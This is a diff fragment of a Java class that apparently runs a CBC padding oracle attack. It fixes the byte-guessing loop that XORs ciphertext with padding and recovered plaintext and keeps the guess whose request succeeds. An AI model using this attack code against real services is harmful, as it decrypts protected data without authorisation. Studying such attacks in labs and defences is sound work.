@@ -80,11 +80,14 @@ public class RequestParallel {
             for (int guess = 0; guess <= 255; guess++) {
                 byte[] bt = Arrays.copyOfRange(bytes, L - 17 - interestingByte, L - 16);
                 if (bt.length != interestingByte + 1) throw new RuntimeException("Incorrect size!");
+                if (bt.length != pad.length) throw new RuntimeException("Incorrect size!");
                 bt = xor(bt, pad);
-                /*
+
+                byte[] encoded_part = Arrays.copyOfRange(decoded, 15 - interestingByte, 16);
+                if (bt.length != encoded_part.length) throw new RuntimeException("Incorrect size!");
+                bt = xor(bt, encoded_part);
+
                 bt[0] = (byte) (bt[0] ^ guess);
-                */
-                for (int i = 0; i < bt.length; i++) bt[i] = (byte) (bt[i] ^ guess);
 
                 byte[] copy = new byte[L];
                 System.arraycopy(bytes, 0, copy, 0, L);
@@ -105,7 +108,7 @@ public class RequestParallel {
                     log.debug(String.format("(byte=%d) (guess=%d) = %d", interestingByte + 1, guess, status));
                     byte guessBt = guess.byteValue();
                     decoded[15 - interestingByte] = guessBt;
-                    bytes[L - 17 - interestingByte] = guessBt;
+                    //bytes[L - 17 - interestingByte] = guessBt;
                     log.debug(String.format("bytes=[%s]", Tools.encoded_raw(bytes)));
                     fail = false;
                     break;
